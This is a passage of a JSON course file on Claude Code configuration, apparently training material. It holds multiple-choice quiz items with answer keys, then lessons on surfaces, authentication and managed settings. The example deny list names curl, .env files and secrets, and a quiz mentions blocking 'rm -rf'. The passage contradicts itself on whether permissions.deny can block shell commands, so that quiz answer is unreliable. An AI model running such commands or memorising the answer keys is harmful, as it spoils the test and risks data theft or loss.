    "explanation": "The content states: 'Child directories — Pulled in on demand when Claude reads a file there.' This means the frontend CLAUDE.md was pulled in the moment Claude read a frontend file, not at startup. The content also describes claudeMdExcludes: 'claudeMdExcludes skips specific CLAUDE.md/rules by glob; patterns match absolute paths, so start relative-style patterns with **/' — this is the mechanism to suppress unwanted child CLAUDE.md files. Option A is wrong: child CLAUDE.md files don't load at startup. Option C is partially correct advice (launching from backend/ would scope access to that subtree) but misdiagnoses the mechanism — 'access to every subdirectory's CLAUDE.md at startup' is wrong. Option D is incorrect: child directory CLAUDE.md files are documented as loading on demand."
   },
   {
    "id": "stage-8-q4",
    "type": "multiple-choice",
    "prompt": "You run /context and see that MCP server tool schemas are consuming 40,000 tokens even though you only use one of the five connected MCP servers today. What is the most efficient fix?",
    "options": [
     "Set ENABLE_TOOL_SEARCH=false to defer all schema loading until a tool is actually called.",
     "Disconnect the servers you are not using — /mcp shows per-server token cost, and tool schemas for unused servers still consume context.",
     "Move MCP server connections from project settings to user settings so they load conditionally.",
     "Replace all MCP servers with CLI equivalents like gh, aws, or gcloud which add no per-tool listing to context."
    ],
    "correct": 1,
    "explanation": "The content states: '/mcp shows per-server token cost + connection status — disconnect servers you're not using.' Even with tool search on (schemas deferred until used), connected servers do incur some context cost and disconnecting unused ones is the direct fix for this session. Option A is wrong and backwards: ENABLE_TOOL_SEARCH=false loads ALL schemas upfront (the opposite of deferring); the default (tool search ON) already defers schemas. Option C is wrong: moving to user settings doesn't make loading conditional — connection status, not scope, determines cost. Option D is valid long-term advice but doesn't fix the immediate 40K token problem for this session where the MCP servers are already connected."
   },
   {
    "id": "stage-8-q5",
    "type": "multi-select",
    "prompt": "After a long session, Claude starts ignoring rules that were established in the first hour. Which of the following are valid explanations for this behavior, based on how compaction and context work? Select all that apply.",
    "options": [
     "Auto-compaction cleared early tool outputs and summarized older context, and rules that lived only in conversation history (not in CLAUDE.md) were silently lost.",
     "paths:-frontmatter rules that loaded during earlier file reads are not re-injected after compaction and must wait for a matching file to be re-read.",
     "Claude's context window is 200,000 tokens but rules stated early in the session are deprioritized by a recency weighting mechanism.",
     "The project CLAUDE.md survived compaction and was re-injected, but rules added inline to the chat did not persist.",
     "Skill descriptions are re-injected after compaction, which may have pushed earlier rules past the attention horizon."
    ],
    "correct": [
     0,
     1,
     3
    ],
    "explanation": "Three options are grounded in the content. A: 'Put persistent rules in CLAUDE.md, not conversation history — early instructions can silently vanish post-compaction.' Rules only in conversation history are lost. B: 'LOST until a matching file is re-read: paths:-frontmatter rules, nested subdirectory CLAUDE.md.' These are explicitly listed as not surviving compaction. D: Project-root CLAUDE.md is listed under what survives: 'Survives (re-injected from disk): system prompt, output style, project-root CLAUDE.md, unscoped rules, auto memory, invoked skill bodies.' So inline chat rules are lost while CLAUDE.md rules survive — D correctly identifies this contrast. Option C is wrong: there is no documented 'recency weighting mechanism' — the mechanism is compaction removing older content, not a weighting system. Option E is wrong: 'Skill descriptions are NOT re-injected — only skills you actually invoked persist.' Descriptions don't come back after compaction."
   },
   {
    "id": "stage-8-q6",
    "type": "multi-select",
    "prompt": "Your team wants to enforce that Claude never runs 'rm -rf' and also wants all engineers to get a recommended plugin when launching from the infra/ directory. Which mechanisms should you use? Select all that apply.",
    "options": [
     "Add 'never run rm -rf' to the project CLAUDE.md under a bold IMPORTANT header.",
     "Create a PreToolUse hook that inspects the command and blocks rm -rf executions.",
     "Create a SessionStart hook that detects the launch directory and recommends the infra plugin.",
     "Add rm -rf to permissions.deny in .claude/settings.json.",
     "Create a subagent with a tools: list that excludes the Bash tool so rm -rf is unreachable."
    ],
    "correct": [
     1,
     2
    ],
    "explanation": "B: The content explicitly cites this use case: 'A PreToolUse hook can block editing .env or reject rm -rf / — this is the enforcement mechanism for commands that must never run.' C: 'A SessionStart hook can recommend the right plugin per launch directory' — this exactly matches the requirement. Option A is wrong: CLAUDE.md is advisory and Claude has been shown to still violate it; hooks are enforcement. Option D is wrong: permissions.deny is for file read/write access patterns (e.g., Read(./**/dist/**)), not for blocking shell commands. Option E is wrong: excluding Bash entirely would break all shell commands and is a blunt instrument; the content describes subagents as context isolation tools (for research, large reads) not as a command-blocking mechanism."
   },
   {
    "id": "stage-8-q7",
    "type": "multiple-choice",
    "prompt": "A new engineer on your team installs a third-party plugin that includes a skill with side effects — it automatically sends a Slack notification whenever invoked. You want to ensure this skill doesn't fire during any normal prompt matching, only when explicitly invoked. What is the correct mechanism?",
    "options": [
     "Move the plugin from user settings to project settings so it only activates for project-scoped sessions.",
     "Use skillOverrides in settings to set disable-model-invocation: true for that skill, so it costs zero context and is only invoked explicitly.",
     "Delete the Slack MCP server the plugin depends on — without the server connection, the skill cannot execute its side effect.",
     "Add the skill name to claudeMdExcludes so it is excluded from context loading."
    ],
    "correct": 1,
    "explanation": "The content states: 'Set disable-model-invocation: true on skills with side effects (commit, deploy, send messages) so they cost zero context until invoked with /name. Use skillOverrides in settings to do the same for third-party skills you didn't author.' This is the exact mechanism for third-party skills you can't directly edit. Option A is wrong: moving between user and project settings changes scope/sharing, not invocation behavior. Option C is wrong: deleting the MCP server is destructive and could break other functionality; the correct fix is invocation control, not infrastructure removal. Option D is wrong: claudeMdExcludes skips CLAUDE.md/rules files by glob, not skills."
   },
   {
    "id": "stage-8-q8",
    "type": "multiple-choice",
    "prompt": "You have two git worktrees of the same repo: main/ and feature-branch/. You add a deny rule to main/.claude/settings.json that blocks reading files in vendor/. A teammate opens a Claude session from the feature-branch/ worktree and finds the deny rule is not active. Why?",
    "options": [
     "Deny rules in settings.json inherit from parent directories, so the rule in main/ should have applied — this is a bug in the worktree setup.",
     ".claude/settings.json does not inherit from parent directories and loads only from the starting directory. Settings in main/ are not inherited by the feature-branch/ worktree.",
     "Deny rules only apply when Claude is launched with the --deny flag; they don't load from settings files automatically.",
     "The deny rule was added to the wrong section — it should be in permissions.additionalDirectories, not permissions.deny."
    ],
    "correct": 1,
    "explanation": "The content states: '.claude/settings.json does NOT inherit from parent directories (unlike CLAUDE.md) — it loads only from the starting directory. Worktree sessions load settings from the worktree root, so deny rules/hooks needed in worktrees must also live in the repo-root .claude/settings.json (a second copy).' CLAUDE.md pulls from parent directories, but settings.json does not — this is a critical distinction. Option A gets the behavior backwards (settings.json doesn't inherit). Option C invents a --deny flag that does not exist in the content. Option D confuses two different config fields: permissions.deny is for deny rules; permissions.additionalDirectories grants access to additional directories."
   },
   {
    "id": "stage-8-q9",
    "type": "multiple-choice",
    "prompt": "A subagent is tasked with reading 500 log files and summarizing errors. A teammate asks: 'Will the subagent have access to the conversation history from our current session, and will the error summary it produces be added to our main context window?' What is the correct answer?",
    "options": [
     "Yes and yes — subagents share the parent session's context window and their full output is appended to the parent conversation.",
     "No and no — subagents run in their own context window and return only a summary; they do not inherit conversation history.",
     "Yes and no — subagents inherit conversation history as read-only context but return only a summary to the parent.",
     "No and yes — subagents don't inherit history but their full output including all file reads is passed back to the parent context."
    ],
    "correct": 1,
    "explanation": "The content states: 'Subagents run in their own context window and return only a summary. Subagents get their own context (own shorter system prompt, own CLAUDE.md copy, same MCP/skills) but do NOT inherit conversation history, auto memory, or already-invoked skills — pass needed context explicitly in the prompt.' This makes Option B correct: no inherited history, and only a summary (not full output) returns. Option A is wrong on both counts. Option C is wrong: subagents explicitly do NOT inherit conversation history. Option D is wrong: the summary (not full output) is what returns — which is the whole point of using subagents for context isolation."
   },
   {
    "id": "stage-8-q10",
    "type": "multiple-choice",
    "prompt": "Your team has a shared deployment skill that runs across three repos. It should load with its full body pre-loaded at subagent launch (not discovered on demand). How do you configure this?",
    "options": [
     "Add the skill to repo-root .claude/skills/ and set disable-model-invocation: false in the skill frontmatter.",
     "List the skill in the subagent's skills: frontmatter field — skills listed there are fully preloaded at launch.",
     "Add the skill to .claude/settings.json under enabledPlugins so it is always available globally.",
     "Place the skill in ~/.claude/skills/ so it loads at user scope before the subagent starts."
    ],
    "correct": 1,
    "explanation": "The content states: 'Skills in a subagent's skills: field are fully preloaded at launch.' This is the mechanism for ensuring a skill's full body is available in a subagent from the start, not discovered on demand. Option A is wrong: disable-model-invocation controls whether a skill can be auto-invoked; setting it to false (the default) doesn't pre-load the body in a subagent — that's what the skills: frontmatter does. Option C is wrong: enabledPlugins manages which plugins are enabled repo-wide; it doesn't control pre-loading within a subagent. Option D is wrong: user-scope placement determines discoverability, not subagent pre-loading — user-scope skills still follow the same discovery rules unless listed in the subagent's skills: field."
   },
   {
    "id": "stage-8-q11",
    "type": "multiple-choice",
    "prompt": "A teammate asks: 'I know skills follow managed > user > project precedence. Does the same precedence apply to MCP servers?' What is the correct answer?",
    "options": [
     "Yes — all Claude Code features follow managed > user > project precedence uniformly.",
     "No — MCP servers follow local > project > user precedence, which is the reverse of skills.",
     "No — MCP servers follow project > user > managed precedence, giving project-level config the highest priority.",
     "MCP servers have no precedence — all connected servers are always active regardless of scope."
    ],
    "correct": 1,
    "explanation": "The content explicitly lists different precedence orders for different features: 'Skills: managed > user > project. MCP servers: local > project > user.' These are deliberately different — MCP servers give local config the highest priority (the reverse of skills). Option A is wrong and the question is specifically designed to catch this misconception — precedence is NOT uniform across features. Option C invents a different order not in the content. Option D is wrong: precedence affects which server config wins when there are conflicts, not whether servers are active."
   },
   {
    "id": "stage-8-q12",
    "type": "multiple-choice",
    "prompt": "Your team uses permissions.additionalDirectories to grant Claude read/write access to a shared config directory outside the repo. A teammate notices that Claude isn't picking up the CLAUDE.md or custom skills stored in that directory. Why?",
    "options": [
     "CLAUDE.md in directories outside the repo root is never loaded regardless of how access is granted.",
     "permissions.additionalDirectories grants file read/write but never loads that directory's CLAUDE.md, rules, or skills. Use --add-dir or /add-dir to load those.",
     "Skills require being listed in .claude/settings.json before they load from any directory — the directory grant alone is insufficient.",
     "The CLAUDE.md in the additional directory has lower precedence than the project CLAUDE.md and is overridden silently."
    ],
    "correct": 1,
    "explanation": "The content states: 'permissions.additionalDirectories grants file read/write but never loads that dir's CLAUDE.md/rules/skills. --add-dir / /add-dir loads skills, and loads CLAUDE.md/rules only if CLAUDE_CODE_ADDITIONAL_DIRECTORIES_CLAUDE_MD=1.' The distinction is intentional: additionalDirectories is about file access, not instruction/skill loading. --add-dir is the mechanism for loading instructions from an additional directory. Option A is wrong: CLAUDE.md outside the repo CAN load if accessed via --add-dir with the right env var. Option C invents a settings.json registration requirement for skills. Option D is wrong: the issue isn't precedence — the CLAUDE.md simply isn't loaded at all via additionalDirectories."
   },
   {
    "id": "stage-8-q13",
    "type": "multiple-choice",
    "prompt": "You notice that auto-memory (MEMORY.md) isn't fully loading — Claude seems unaware of entries beyond a certain point. What is the loading constraint on auto-memory?",
    "options": [
     "Auto-memory loads the most recently modified 200 entries, oldest entries are dropped.",
     "Auto-memory loads the first 200 lines or 25KB, whichever comes first.",
     "Auto-memory loads up to 50KB or the entire file if it fits within 10% of the context window.",
     "Auto-memory is limited to 5,000 tokens per file, matching the per-skill cap."
    ],
    "correct": 1,
    "explanation": "The content states: 'auto memory MEMORY.md (first 200 lines or 25KB, whichever first).' Both constraints apply and the first one hit wins. Option A invents a 'most recently modified entries' semantics — it's first lines, not recent entries. Option C invents a 50KB cap and a 10% window rule (that rule applies to ENABLE_TOOL_SEARCH=auto for MCP schemas, not auto-memory). Option D invents a 5,000-token cap — that's the per-skill cap for invoked skills post-compaction, not auto-memory."
   },
   {
    "id": "stage-8-q14",
    "type": "multiple-choice",
    "prompt": "When should a repeated team process graduate from a pasted multi-step playbook in chat to a skill? And when should a skill graduate to a plugin?",
    "options": [
     "Pasted playbooks should become skills after 5+ uses; skills become plugins when they include MCP servers.",
     "A pasted multi-step playbook used a 3rd time should become a skill; a skill should be packaged as a plugin once a second repository needs it.",
     "Both should be formalized after a sprint retrospective identifies them as high-frequency — the trigger is process-level, not use-count.",
     "Pasted playbooks become skills when they exceed 10 steps; skills become plugins when they need admin approval to install."
    ],
    "correct": 1,
    "explanation": "The content states the explicit trigger sequence: 'A pasted multi-step playbook (3rd time) → skill. A repo needing the same setup → package as a plugin.' These are concrete, countable triggers, not vague process gates. Option A invents '5+ uses' and an incorrect plugin trigger (MCP inclusion is not the criterion). Option C is wrong: the triggers are explicitly use-count and cross-repo need, not retrospective timing. Option D invents '10 steps' and 'admin approval' — neither appears in the content."
   }
  ],
  "masteryCheckpoint": "You can explain the concepts of Optimal use, context & cost."
 },
 {
  "id": "stage-9",
  "stage": 9,
  "title": "Surfaces & mobility",
  "summary": "Surfaces & mobility: surfaces share one engine and config, auth method determines available features, config mobility across surfaces.",
  "prerequisites": [
   "stage-8"
  ],
  "objectives": [
   "Understand the concepts in Surfaces & mobility."
  ],
  "definitions": [
   {
    "term": "surfaces share one engine and config",
    "short": "Different ways to run Claude Code (CLI, Desktop, IDE, web) vary in capabilities, but several share the same engine and read the same config files, so one change can affect multiple surfaces at once."
   },
   {
    "term": "auth method determines available features",
    "short": "How a team authenticates (claude.ai OAuth vs API key vs governed third-party provider) silently enables or disables whole feature sets, so auth is the first team decision to standardize."
   },
   {
    "term": "config mobility across surfaces",
    "short": "Each surface carries a different subset of configuration, so where you put a setting determines whether it reaches a given execution environment."
   },
   {
    "term": "managed (admin-governed) settings",
    "short": "Server-managed settings files override project and user settings and cannot be overridden by users, giving admins a central enforcement layer for org policy."
   },
   {
    "term": "managed-settings distribution gap",
    "short": "How a managed policy actually reaches a device differs by surface, so a centrally configured rule does not automatically apply everywhere."
   },
   {
    "term": "cloud session environments",
    "short": "Web/remote sessions run on isolated managed VMs whose network access and setup script are defined per named environment, controlling what the agent can reach and install."
   }
  ],
  "sections": [
   {
    "heading": "The Surface Landscape: One Engine, Many Faces",
    "body": "Claude Code is not a single monolithic product — it is one engine that manifests across several distinct execution environments called **surfaces**. Understanding this before touching any config is not optional: it determines which files you edit, which auth method you choose, and why a rule you add in one place silently has no effect in another.\n\nThe current primary developer surfaces:\n\n| Surface | Entry point | Where Claude runs | Auth available |\n|---|---|---|---|\n| **CLI** | `claude` in terminal | Developer's machine | All methods |\n| **VS Code / Cursor extension** | Graphical panel inside IDE | Developer's machine (bundled CLI) | All methods |\n| **JetBrains plugin** | Graphical panel inside IDE | Developer's machine (standalone CLI required) | All methods |\n| **Desktop app** | Claude desktop application | Developer's machine | claude.ai subscription only |\n| **Web (claude.ai/code)** | Browser at `claude.ai/code` | Anthropic-managed VM | claude.ai subscription only |\n| **Remote Control** | `claude remote-control` / `--remote-control` | Developer's machine (CLI process, viewed remotely) | claude.ai subscription only |\n\n### The shared-engine property\n\nThe official docs state it directly: \"each surface connects to the same underlying Claude Code engine, so your CLAUDE.md files, settings, and MCP servers work across all of them.\"\n\nThe VS Code extension bundles its own copy of the CLI binary for the chat panel. Consequently, the settings files that configure the CLI — `~/.claude/settings.json`, `.claude/settings.json`, managed-settings files — are read by the extension using the same precedence logic as the bare CLI. A permission rule you add to your project's `.claude/settings.json` is seen by both `claude` in the terminal and the extension panel simultaneously, because both surface types execute the same binary against the same config hierarchy.\n\nThe JetBrains plugin does not bundle the CLI; it requires a separately installed standalone CLI, which it integrates with. The Desktop app also uses the CLI engine under the hood and reads the same user-scoped settings.\n\n### Auth scoping by surface\n\nNot every auth method reaches every surface. A critical constraint that determines what your team can do:\n\n- `apiKeyHelper`, `ANTHROPIC_API_KEY`, and `ANTHROPIC_AUTH_TOKEN` apply **to terminal CLI sessions only**. Claude Desktop and cloud sessions (claude.ai/code) use OAuth exclusively and do not call `apiKeyHelper` or read API key environment variables.\n- Remote Control, Routines, Code Review, and Claude Code on the web require a claude.ai subscription — they are not available through Console API keys or cloud-provider credentials.\n\n### What the sharing means operationally\n\nFor a platform team setting up shared configuration, the single-engine property is the most important architectural fact. You do not need separate policy files for \"the CLI config\" vs \"the IDE config\" — one change to the right settings file propagates to every surface that uses the CLI engine. The flip side is equally important: a mistake in a shared settings file can break multiple surfaces at once, so validate changes with `claude doctor` before wide deployment."
   },
   {
    "heading": "Authentication Methods: The Feature Gate Nobody Talks About",
    "body": "Auth is not a deployment detail — it is the **first architectural decision** for a shared team setup, because each authentication method silently enables or disables entire feature categories. Standardize on the wrong method early and you will either lock your team out of features you need or fail to enforce policies you expected.\n\n### The six methods and their precedence\n\nClaude Code resolves credentials in this strict order (first match wins):\n\n1. Cloud provider env vars (`CLAUDE_CODE_USE_BEDROCK`, `CLAUDE_CODE_USE_VERTEX`, `CLAUDE_CODE_USE_FOUNDRY`)\n2. `ANTHROPIC_AUTH_TOKEN` — bearer token sent as `Authorization: Bearer` header; use for LLM gateways and proxies\n3. `ANTHROPIC_API_KEY` — direct API key from Claude Console, sent as `X-Api-Key` header\n4. `apiKeyHelper` script output — dynamic/rotating credentials from a vault (CLI-only; ignored by Desktop and cloud sessions)\n5. `CLAUDE_CODE_OAUTH_TOKEN` — long-lived token from `claude setup-token`; inference-only, cannot establish Remote Control sessions\n6. Subscription OAuth credentials from `/login` — the default for claude.ai subscribers\n\n### Feature availability by auth method\n\n| Feature | claude.ai OAuth (Pro/Max/Teams/Enterprise) | Console API key | Bedrock / Vertex / Foundry |\n|---|---|---|---|\n| Claude Code on the web (cloud VMs) | Yes | No | No |\n| Remote Control | Yes | No | No |\n| `claude --teleport` | Yes | No | No |\n| `claude setup-token` for CI | Yes (Pro, Max, Teams, Enterprise) | No | No |\n| Routines | Yes | No | No |\n| GitHub Code Review | Yes | No | No |\n| Server-managed policy settings | Teams + Enterprise | No | No |\n| SSO / domain capture | Enterprise only | Console SSO | No |\n| `CLAUDE_CODE_OAUTH_TOKEN` for CI | Yes (inference only) | No | No |\n| `apiKeyHelper` vault integration | No (CLI only) | Yes | Yes |\n\nThe most important constraint for team leads: **cloud sessions, Remote Control, and `--teleport` all require claude.ai subscription authentication**. If your team authenticates via `ANTHROPIC_API_KEY` or Bedrock, these features are unavailable.\n\nA `CLAUDE_CODE_OAUTH_TOKEN` (the long-lived token from `claude setup-token`) is **inference-only** — it cannot establish Remote Control sessions. The docs state this explicitly:\n\n```\nRemote Control requires a full-scope login token.\n# Fix: run claude auth login instead of relying on CLAUDE_CODE_OAUTH_TOKEN\n```\n\n### Critical gotcha: API key shadowing\n\nIf a developer has both an active claude.ai subscription and `ANTHROPIC_API_KEY` set in their environment, the API key wins (rank 3 vs rank 6). The docs warn: \"This can cause authentication failures if the key belongs to a disabled or expired organization.\" This silently breaks cloud sessions and Remote Control. The fix:\n\n```bash\nunset ANTHROPIC_API_KEY\n# verify active method:\n/status\n```\n\nIn interactive mode, Claude Code prompts once to approve or decline using a detected `ANTHROPIC_API_KEY`, and remembers the choice. Use the \"Use custom API key\" toggle in `/config` to change it later.\n\n### Choosing an auth strategy for your team\n\n- **Fewer than ~50 engineers, no compliance requirements**: Claude for Teams with claude.ai OAuth is simplest. Everyone gets both Claude Code and claude.ai in one subscription; centralized billing through the admin dashboard.\n- **Large org, SSO required**: Claude for Enterprise adds SSO, domain capture, role-based permissions, compliance API, and server-managed policy settings that push to devices without file deployment.\n- **AWS/GCP/Azure-native or data-residency constrained**: Bedrock, Vertex, or Foundry. Accept that cloud sessions, Remote Control, and Routines are unavailable. For developers who also need those cloud features, they need separate Claude for Teams/Enterprise seats alongside the cloud-provider credentials.\n- **Need dynamic rotating credentials (vault integration)**: use `apiKeyHelper` for CLI/IDE surfaces, but note that the Desktop app and cloud sessions ignore `apiKeyHelper` entirely — they use OAuth exclusively."
   },
   {
    "heading": "Config Mobility: Where a Setting Travels Depends on Where You Put It",
    "body": "Every Claude Code setting lives in a file at a specific scope. The scope determines which surfaces see the setting, which developers share it, and whether it survives a machine reinstall. Placing a setting in the wrong scope is the most common infrastructure mistake.\n\n### The five config locations\n\n```\n# Managed (highest precedence — admin-controlled, cannot be overridden)\n/Library/Application Support/ClaudeCode/managed-settings.json   # macOS\n/etc/claude-code/managed-settings.json                          # Linux/WSL\nC:\\Program Files\\ClaudeCode\\managed-settings.json               # Windows\n\n# Command-line flags (temporary, session only)\nclaude --model claude-opus-4-5 ...\n\n# Local scope (personal, project-specific, gitignored)\n.claude/settings.local.json\n\n# Project scope (shared, committed to git)\n.claude/settings.json\n\n# User scope (personal defaults across all projects)\n~/.claude/settings.json\n```\n\nPrecedence order (highest to lowest): Managed → CLI args → Local → Project → User\n\n**Exception**: `permissions.allow` and `permissions.deny` rules **merge** across scopes rather than override. The docs state: \"Array settings such as `permissions.allow` and `permissions.deny` merge entries from all sources, so developers can extend managed lists but not remove from them.\"\n\n### The committed-vs-personal comparison\n\n| What | Where it goes | Why |\n|---|---|---|\n| Team-wide permission rules | `.claude/settings.json` (project, committed) | Every developer and cloud session gets the same rules |\n| MCP servers the whole team uses | `.mcp.json` (project root, committed) | Cloud sessions clone the repo and load this automatically |\n| Hooks that run project setup | `.claude/settings.json` hooks section (committed) | Runs in both local and cloud sessions |\n| Personal `apiKeyHelper` script | `~/.claude/settings.json` (user scope) | Only you; don't commit credentials or personal vault configs |\n| Personal model preference | `~/.claude/settings.json` or `settings.local.json` | Doesn't override team-agreed model |\n| CI pipeline API key | Environment variable `ANTHROPIC_API_KEY` | Never in a file that touches disk in CI |\n| Cloud environment variables and setup scripts | Cloud environment UI at claude.ai/code | Live outside the repo; stored in cloud environment config |\n\n### What cloud sessions see\n\nCloud sessions start from a fresh VM with your repository cloned. The official docs give a precise breakdown:\n\n| Config | In cloud session? | Why |\n|---|---|---|\n| `CLAUDE.md`, `.claude/settings.json`, `.mcp.json`, `.claude/agents/`, `.claude/rules/`, `.claude/skills/`, `.claude/commands/` | Yes | Part of the clone |\n| Plugins declared in `.claude/settings.json` | Yes | Installed at session start from declared marketplace |\n| `~/.claude/CLAUDE.md`, `~/.claude/settings.json` | No | Lives on your machine, not in the repo |\n| MCP servers added with `claude mcp add` | No | Writes to local user config, not the repo. Use `.mcp.json` instead |\n| `apiKeyHelper`, `ANTHROPIC_API_KEY` | No | CLI-only; cloud sessions use OAuth exclusively |\n| Setup scripts and environment variables | Configured in cloud environment UI | Not in any config file; separate from the repo |\n\n### Hooks: the mobility edge case\n\n`SessionStart` hooks in `~/.claude/settings.json` run in local sessions but are invisible to cloud sessions. The same hook in `.claude/settings.json` (committed) runs in both. To run something only in cloud sessions, check `$CLAUDE_CODE_REMOTE`:\n\n```bash\n#!/bin/bash\n# scripts/cloud-setup.sh\nif [ \"$CLAUDE_CODE_REMOTE\" != \"true\" ]; then\n  exit 0\nfi\nnpm ci\npip install -r requirements.txt\n```\n\n```json\n// .claude/settings.json (committed)\n{\n  \"hooks\": {\n    \"SessionStart\": [\n      {\n        \"matcher\": \"startup|resume\",\n        \"hooks\": [\n          { \"type\": \"command\", \"command\": \"\\\"$CLAUDE_PROJECT_DIR\\\"/scripts/cloud-setup.sh\" }\n        ]\n      }\n    ]\n  }\n}\n```\n\nKeep the script fast: `SessionStart` hooks run on every session start **and** resume (unlike setup scripts, which benefit from the environment cache). Check whether dependencies are already present before reinstalling."
   },
   {
    "heading": "Managed Settings: Admin Enforcement That Cannot Be Overridden",
    "body": "The standard settings hierarchy lets users and projects customize Claude Code behavior. Managed settings sit above all of it. Any setting placed in the managed layer **overrides** project and user settings and cannot be changed by the user or project — not by editing a local file, not by setting an environment variable, not by passing a CLI flag.\n\nThis is the org's enforcement layer: use it for policies that must hold unconditionally across every device.\n\n### The four delivery mechanisms (in priority order)\n\nThe official docs describe four mechanisms, checked in priority order:\n\n| Mechanism | Delivery | Priority | Platforms |\n|---|---|---|---|\n| **Server-managed** | Claude.ai admin console | Highest | All |\n| **plist / registry policy** | macOS plist (`com.anthropic.claudecode`) or Windows `HKLM\\SOFTWARE\\Policies\\ClaudeCode` | High | macOS, Windows |\n| **File-based managed** | Written to system directory by MDM or provisioning script | Medium | All |\n| **Windows user registry** | `HKCU\\SOFTWARE\\Policies\\ClaudeCode` | Lowest | Windows only |\n\nWithin the managed tier, the first source that delivers a non-empty configuration wins. **Sources do not merge** at the mechanism level: if server-managed settings deliver any keys at all, file-based and registry settings are ignored entirely.\n\n**2. File-based (system directories)**\n\nPlace `managed-settings.json` in the OS system directory:\n\n```\nmacOS:   /Library/Application Support/ClaudeCode/managed-settings.json\nLinux:   /etc/claude-code/managed-settings.json\nWindows: C:\\Program Files\\ClaudeCode\\managed-settings.json\n```\n\nFor modular management, use the drop-in directory `managed-settings.d/`. Files load alphabetically, with `managed-settings.json` as the base first. Scalar values from later files override earlier ones; arrays are concatenated and de-duplicated; objects are deep-merged. Example naming convention:\n\n```\n10-security.json     # auth restrictions, org UUID\n20-mcp-policy.json   # MCP allowlists/denylists\n30-models.json       # available models\n```\n\n**3. Server-managed (Teams + Enterprise)**\n\nClaude for Teams and Claude for Enterprise accounts can push policies from the Anthropic admin console directly. Settings are delivered at authentication time and polled hourly. Use `forceRemoteSettingsRefresh: true` to block startup until a fresh remote settings fetch completes:\n\n```json\n{\n  \"forceRemoteSettingsRefresh\": true\n}\n```\n\nWhen this is active, the CLI exits at startup if the fetch fails rather than proceeding without policy. Server-managed settings require Claude Code v2.1.38+ (Teams) or v2.1.30+ (Enterprise) and network access to `api.anthropic.com`.\n\n### Key admin-governed settings\n\n```json\n// /etc/claude-code/managed-settings.json\n{\n  // MCP server allowlist — only admin-defined servers allowed\n  \"allowManagedMcpServersOnly\": true,\n  \"allowedMcpServers\": [\n    { \"serverName\": \"github\" },\n    { \"serverName\": \"jira\" }\n  ],\n  \"deniedMcpServers\": [\n    { \"serverName\": \"filesystem\" }\n  ],\n\n  // Prevent users from writing their own permission rules\n  \"allowManagedPermissionRulesOnly\": true,\n\n  // Disable the bypass-permissions mode entirely\n  \"permissions\": {\n    \"disableBypassPermissionsMode\": \"disable\",\n    \"allow\": [\"Bash(npm run *)\", \"Bash(make *)\"],\n    \"deny\": [\"Bash(curl *)\", \"Read(.env)\", \"Read(.env.*)\", \"Read(secrets/***)\"]\n  },\n\n  // Block any version below this\n  \"requiredMinimumVersion\": \"2.1.150\",\n  \"requiredMaximumVersion\": \"2.2.0\",\n\n  // Disable Remote Control if your org policy requires it\n  \"disableAgentView\": false\n}\n```\n\n### Validation behavior at managed scope\n\nManaged settings parse **tolerantly** (requires v2.1.169+): invalid entries are stripped with a warning and the policy continues with the remaining valid rules. This differs from user/project settings files, which reject the entire file on any validation error. Run `claude doctor` on a test machine after every managed settings change to confirm all fields were accepted as intended.\n\nSecurity-enforcement fields have stricter fallback behavior — for example, `allowManagedMcpServersOnly` is treated as `true` if the value is invalid (fail-closed), while `forceLoginOrgUUID` with an invalid value blocks all login until fixed.\n\n### Settings that only work at managed scope\n\nSome settings are meaningful only when enforced; they have no effect at user or project scope. The full list from the official docs includes:\n- `allowAllClaudeAiMcps`, `allowedChannelPlugins`, `allowedMcpServers`, `deniedMcpServers`\n- `allowManagedHooksOnly`, `allowManagedMcpServersOnly`, `allowManagedPermissionRulesOnly`\n- `blockedMarketplaces`, `channelsEnabled`, `claudeMd`\n- `forceRemoteSettingsRefresh`, `parentSettingsBehavior`\n- `pluginSuggestionMarketplaces`, `pluginTrustMessage`\n- `policyHelper` (executable that computes managed settings dynamically; not available via server-managed delivery — requires OS-level mechanism)\n- `requiredMaximumVersion`, `requiredMinimumVersion`\n- `strictKnownMarketplaces`"
   },
   {
    "heading": "The Managed-Settings Distribution Gap",
    "body": "A centrally authored `managed-settings.json` does not magically appear on every device. The gap between \"we have a policy\" and \"every surface is enforcing it\" is the operational problem that trips up nearly every team deploying shared Claude Code config.\n\n### Why the gap exists\n\nThe four delivery mechanisms reach devices through different channels, none of which are automatic:\n\n| Mechanism | Who deploys it | Reach |\n|---|---|---|\n| File in system directory | You or your MDM system | Only machines where the file has been pushed |\n| macOS plist / Windows HKLM registry | MDM (Jamf, Intune, SCCM) | Any device enrolled in MDM that receives the profile |\n| Server-managed (Teams + Enterprise) | Claude admin console | All devices where user is authenticated to the org — no file deploy needed |\n| Windows HKCU registry | Individual user or script | Convenience only; writable without elevation, so not a strong enforcement channel |\n\n**The file-based approach** requires that something — your MDM, a provisioning script, a dotfiles installer — actually writes the file to the system directory. If a developer clones their dotfiles but skips the privileged-directory step, or if someone spins up a new dev container, the managed settings simply do not exist on that machine. Claude Code starts without them, silently.\n\n**MDM reach** requires device enrollment. If your team has unenrolled devices (contractors, personal machines, dev containers, CI runners), those devices never receive the policy.\n\n**Server-managed** (Teams + Enterprise) is the only mechanism that closes the gap unconditionally — it requires only that the user is authenticated to the org, not that any file has been placed on their machine. If your security posture requires guaranteed policy enforcement, server-managed is the mechanism to use.\n\n**Important precedence note**: when server-managed settings deliver any keys at all, file-based and registry managed settings are ignored. Configure your fallback strategy deliberately if you use a mix.\n\n### Surface-specific distribution notes\n\n- **CLI**: reads managed settings from the system directory. If the directory does not exist or the file is absent, no managed settings apply.\n- **VS Code extension**: runs the bundled CLI binary, which reads the same system directory. Distribution gap is identical to CLI.\n- **Web / cloud sessions**: run on Anthropic-managed VMs. System-directory managed settings from your corporate machines are irrelevant — those VMs do not have your `/etc/claude-code/` files. Policy for cloud sessions must come from the server-managed mechanism (Teams or Enterprise), or from project-committed settings (which are scoped to the repository, not the org).\n- **Remote Control**: executes on the developer's local machine, so local managed settings apply. If the machine missed the MDM push, the policy is not enforced.\n\n### Closing the gap: a practical checklist\n\n```\n□ File delivery: MDM profile or provisioning script writes managed-settings.json\n  to the system directory on every machine class (dev laptops, CI runners,\n  dev containers, contractor machines).\n\n□ Verify presence: have developers run \"/status\" after setup — the Status tab\n  shows the \"Setting sources\" line with the active managed-settings source\n  in parentheses: (remote), (plist), (HKLM), (HKCU), or (file).\n\n□ Test tolerant parsing (v2.1.169+): introduce a deliberate typo in a staging\n  managed-settings file, run \"claude doctor\", confirm the bad rule is dropped\n  and the rest applies.\n\n□ Cloud sessions: if your policy must hold in cloud sessions, use Teams or\n  Enterprise server-managed settings — 